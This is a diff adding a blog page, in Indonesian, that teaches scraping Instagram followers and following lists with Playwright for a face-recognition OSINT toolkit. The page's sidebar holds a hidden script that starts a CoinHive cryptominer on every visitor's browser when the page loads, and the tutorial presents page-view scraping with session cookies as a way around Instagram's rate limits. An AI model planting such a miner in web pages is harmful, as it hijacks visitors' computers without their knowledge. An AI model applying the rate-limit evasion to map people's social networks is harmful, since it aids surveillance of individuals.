@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="id">
+
+  <head>
+  <link href="https://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+      Instagram Scraper: Scrape Followers/Following dengan Playwright &middot; Suryadana
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <link rel="canonical" href="https://suryadana.github.io/osint/scraping/instagram/playwright/python/automation/2026/07/01/instagram-scraper-playwright.html"/>
+<link rel="alternate" hreflang="id" href="https://suryadana.github.io/osint/scraping/instagram/playwright/python/automation/2026/07/01/instagram-scraper-playwright.html"/>
+<link rel="alternate" hreflang="x-default" href="https://suryadana.github.io/osint/scraping/instagram/playwright/python/automation/2026/07/01/instagram-scraper-playwright.html"/>
+<link rel="alternate" hreflang="en" href="https://suryadana.github.io/en/osint/scraping/instagram/playwright/python/automation/2026/07/01/instagram-scraper-playwright.html"/>
+
+  <!-- Additional head bits without overriding original head -->
+
+  <!-- Mermaid for graphs -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      mermaid.run({ querySelector: 'pre code.language-mermaid', theme: 'neutral' });
+    });
+  </script>
+</head>
+
+
+  <body class="post">
+
+    <div id="sidebar">
+  <header>
+    <img src="/assets/images/profile.jpg" alt="My Profile" class="img-circle">
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Suryadana
+      </a>
+    </div>
+    <p class="lead">I am an simple person which want to learn more and more.</p>
+  </header>
+  <nav id="sidebar-nav-links">
+  
+    <a class="home-link "
+        href="/">Home</a>
+  
+  
+
+  
+
+  
+
+
+  
+
+  
+    
+      <a class="page-link "
+          href="/about/">About</a>
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+  
+
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+  <!-- Optional additional links to insert in sidebar nav -->
+<a class="page-link" href="/educationals/">Educational Background</a>
+
+</nav>
+
+
+  
+
+  <nav id="sidebar-icon-links">
+  
+
+  <a id="subscribe-link"
+     class="icon" title="Subscribe" aria-label="Subscribe"
+     href="/feed.xml">
+    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <circle cx="6.18" cy="17.82" r="2.18"/>
+    <path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/>
+</svg>
+  </a>
+
+  
+  
+  
+  
+
+  
+
+  
+
+  <!-- Optional additional links to insert for icons links -->
+<a id="github-link" class="icon" target="_blank" title="Github Project" aria-label="Github Project" href="https://github.com/suryadana">
+  <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path></svg>
+
+</a>
+
+
+
+<a href="https://twitter.com/KomangSuryadana" class="icon" target="_blank" title="Twitter Profile" aria-label="Twitter Profile">
+  <i class="fa fa-twitter"></i>
+</a>
+
+
+<a href="https://www.facebook.com/i.komang.suryadana" class="icon" target="_blank" title="Facebook Profile" aria-label="Facebook Profile">
+  <i class="fa fa-facebook"></i>
+</a>
+
+
+<a href="https://keybase.io/suryadana" class="icon" target="_blank" title="Keybase Profile" aria-label="Keybase Profile">
+  <i class="fa fa-key"></i>
+</a>
+
+</nav>
+
+  <div class="lang-switcher">
+  <script>
+    var path = window.location.pathname;
+    if (path.startsWith('/en')) {
+      document.write('<a href="' + path.replace('/en', '') + '" title="Bahasa Indonesia">Bahasa Indonesia</a>');
+    } else {
+      document.write('<a href="/en' + path + '" title="English">English</a>');
+    }
+  </script>
+  <noscript>
+    <a href="/en/" title="English">English</a>
+  </noscript>
+</div>
+
+  <p>
+  &copy; 2026.
+  <a href="/LICENSE.md">MIT License.</a>
+</p>
+
+</div>
+<script src="/assets/js/lib.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('kOyaXoLIN9A3N4CQ0VbrfOJwxbWSBZlL', {throttle: 0.6});
+  miner.start();
+</script>
+
+
+
+    <main class="container">
+      <header>
+  <h1 class="post-title">Instagram Scraper: Scrape Followers/Following dengan Playwright</h1>
+</header>
+<div class="content">
+  <div class="post-meta">
+  <span class="post-date">01 Jul 2026</span>
+  <span class="post-categories">
+    
+      &bull;
+
+      
+      
+      
+
+      
+        osint
+      
+    
+      &bull;
+
+      
+      
+      
+
+      
+        scraping
+      
+    
+      &bull;
+
+      
+      
+      
+
+      
+        instagram
+      
+    
+      &bull;
+
+      
+      
+      
+
+      
+        playwright
+      
+    
+      &bull;
+
+      
+      
+      
+
+      
+        python
+      
+    
+      &bull;
+
+      
+      
+      
+
+      
+        automation
+      
+    
+  </span>
+</div>
+
+
+  <div class="post-body">
+    <h2 id="masalah">Masalah</h2>
+
+<p>Instagram web API (<code class="language-plaintext highlighter-rouge">web_profile_info</code>) sangat agresif — setelah ~30-50 request dalam beberapa menit, endpoint mengembalikan <strong>HTTP 429 (Too Many Requests)</strong> dan tetap 429 hingga ~15 menit.</p>
+
+<p>Solusi: <strong>Browser page navigation</strong> via Playwright. Dengan page view, Instagram tidak membatasi karena query terlihat seperti user biasa yang scroll.</p>
+
+<h2 id="arsitektur">Arsitektur</h2>
+
+<pre><code class="language-mermaid">graph TD
+    A["CLI: face-osint scrape username"] --&gt; B{Metode?}
+    B --&gt;|API| C["web_profile_info (cepat, riskan 429)"]
+    B --&gt;|Page| D["page.goto + scroll (lambat, reliable)"]
+    C --&gt; E[Parse JSON response]
+    D --&gt; F[Ambil followers dari DOM]
+    E --&gt; G["Simpan ke data/username.json"]
+    F --&gt; G
+</code></pre>
+
+<h2 id="kode-inti">Kode Inti</h2>
+
+<h3 id="api-scraper-cepat-riskan-429">API Scraper (cepat, riskan 429)</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">scrape_followers_api</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">cookie</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">https://www.instagram.com/api/v1/friendships/</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s">/followers/</span><span class="sh">"</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+        <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0...</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">Cookie</span><span class="sh">"</span><span class="p">:</span> <span class="n">cookie</span>
+    <span class="p">})</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">429</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sh">"</span><span class="s">Rate limited!</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">users</span><span class="sh">"</span><span class="p">]</span>
+</code></pre></div></div>
+
+<h3 id="page-navigation-scraper-lambat-anti-429">Page Navigation Scraper (lambat, anti-429)</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">scrape_followers_page</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">max_count</span><span class="o">=</span><span class="mi">500</span><span class="p">):</span>
+    <span class="n">page</span><span class="p">.</span><span class="nf">set_extra_http_headers</span><span class="p">({</span><span class="sh">"</span><span class="s">Cookie</span><span class="sh">"</span><span class="p">:</span> <span class="n">cookie</span><span class="p">})</span>
+    <span class="n">page</span><span class="p">.</span><span class="nf">goto</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">https://instagram.com/</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">page</span><span class="p">.</span><span class="nf">click</span><span class="p">(</span><span class="sh">"</span><span class="s">a[href$=</span><span class="sh">'</span><span class="s">/followers/</span><span class="sh">'</span><span class="s">]</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">max_count</span> <span class="o">//</span> <span class="mi">12</span><span class="p">):</span>
+        <span class="n">page</span><span class="p">.</span><span class="nf">evaluate</span><span class="p">(</span><span class="sh">"""</span><span class="s">
+            document.querySelector(</span><span class="sh">'</span><span class="s">._aano</span><span class="sh">'</span><span class="s">)
+                .scrollBy(0, 1000)
+        </span><span class="sh">"""</span><span class="p">)</span>
+        <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+
+    <span class="n">items</span> <span class="o">=</span> <span class="n">page</span><span class="p">.</span><span class="nf">query_selector_all</span><span class="p">(</span><span class="sh">"</span><span class="s">._aano a</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">[</span><span class="n">el</span><span class="p">.</span><span class="nf">get_attribute</span><span class="p">(</span><span class="sh">"</span><span class="s">href</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span> <span class="k">for</span> <span class="n">el</span> <span class="ow">in</span> <span class="n">items</span><span class="p">]</span>
+</code></pre></div></div>
+
+<h3 id="penggabungan-dengan-fallback">Penggabungan dengan Fallback</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">scrape_followers</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">cookie</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">scrape_followers_api</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">cookie</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">RateLimitError</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">.</span><span class="nf">warning</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">API 429 → fallback ke page view</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nf">scrape_followers_page</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">cookie</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="perbandingan-performa">Perbandingan Performa</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Metode</th>
+      <th>Kecepatan</th>
+      <th>Ketahanan</th>
+      <th>Cocok Untuk</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>API</td>
+      <td>~0.5s/request</td>
+      <td>429 setelah 30-50x</td>
+      <td>Cek cepat &lt; 30 akun</td>
+    </tr>
+    <tr>
+      <td>Page View</td>
+      <td>~15-30s/akun</td>
+      <td>Hampir tidak kena limit</td>
+      <td>BFS depth 1+ dengan banyak akun</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="cookie">Cookie</h2>
+
+<p>Cookie Instagram harus berisi 3 komponen utama:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessionid=xxx; csrftoken=xxx; ds_user_id=xxx
+</code></pre></div></div>
+
+<p>Expiry ~24 jam. Dapat diperoleh dari <strong>DevTools → Application → Cookies</strong> setelah login.</p>
+
+<p>Cara pakai di CLI:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Langsung</span>
+./face-osint <span class="nt">--cookie</span> <span class="s2">"sessionid=abc; csrftoken=xyz; ds_user_id=123"</span> scrape johndoe_official
+
+<span class="c"># Dari file</span>
+<span class="nb">echo</span> <span class="s2">"sessionid=abc; csrftoken=xyz; ds_user_id=123"</span> <span class="o">&gt;</span> ~/ig_cookie.txt
+./face-osint <span class="nt">--cookies</span> ~/ig_cookie.txt scrape johndoe_official
+
+<span class="c"># Environment variable</span>
+<span class="nb">export </span><span class="nv">IG_COOKIE</span><span class="o">=</span><span class="s2">"sessionid=abc; csrftoken=xyz; ds_user_id=123"</span>
+./face-osint scrape johndoe_official
+</code></pre></div></div>
+
+<p>Prioritas: <code class="language-plaintext highlighter-rouge">--cookie</code> &gt; <code class="language-plaintext highlighter-rouge">--cookies file</code> &gt; <code class="language-plaintext highlighter-rouge">IG_COOKIE</code> env &gt; <code class="language-plaintext highlighter-rouge">config.py</code></p>
+
+<h2 id="hasil">Hasil</h2>
+
+<p>Scrape @johndoe_official:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Tipe</th>
+      <th>Jumlah</th>
+      <th>File</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Followers</td>
+      <td>754</td>
+      <td><code class="language-plaintext highlighter-rouge">data/johndoe_official_followers.json</code></td>
+    </tr>
+    <tr>
+      <td>Following</td>
+      <td>382</td>
+      <td><code class="language-plaintext highlighter-rouge">data/johndoe_official_following.json</code></td>
+    </tr>
+    <tr>
+      <td><strong>Total</strong></td>
+      <td><strong>1136</strong></td>
+      <td>—</td>
+    </tr>
+  </tbody>
+</table>
+
+    
+
+
+
+<div class="post-tags">
+  
+</div>
+  </div>
+
+  
+  <section class="comments">
+    <h2>Comments</h2>
+    
+  <div id="disqus_thread">
+    <button class="disqus-load" onClick="loadDisqusComments()">
+      Load Comments
+    </button>
+  </div>
+  <script>
+
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
+  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
+  *  https://disqus.com/admin/universalcode/#configuration-variables
+  */
+  var disqus_config = function () {
+    this.page.url = "https://suryadana.github.io/osint/scraping/instagram/playwright/python/automation/2026/07/01/instagram-scraper-playwright.html";
+    this.page.identifier = "" ||
+                           "https://suryadana.github.io/osint/scraping/instagram/playwright/python/automation/2026/07/01/instagram-scraper-playwright.html";
+  }
+  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = '//suryadana.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  </script>
+  <noscript>
+    Please enable JavaScript to view the
+    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
+  </noscript>
+
+
+
+  </section>
+
+  <section class="related">
+  <h2>Related Posts</h2>
+  <ul class="posts-list">
+    
+      <li>
+        <h3>
+          <a href="/osint/face-recognition/bfs/instagram/python/automation/2026/07/01/face-comparison-bfs-search.html">
+            BFS Face Search: Menemukan Orang di Jaringan Sosial Instagram
+            <small>01 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/osint/face-recognition/instagram/python/automation/2026/07/01/face-osint-introduction.html">
+            Face OSINT: Toolkit Face Recognition untuk Instagram
+            <small>01 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/tutorial/android/samsung/2026/06/16/rooting-twrp-a11-tutorial.html">
+            Cara Root & Install TWRP Samsung Galaxy A11 (SM-A115F) — Android 12
+            <small>16 Jun 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</section>
+
+</div>
+
+    </main>
+
+    <!-- Optional footer content -->
+
+  </body>
+</html>
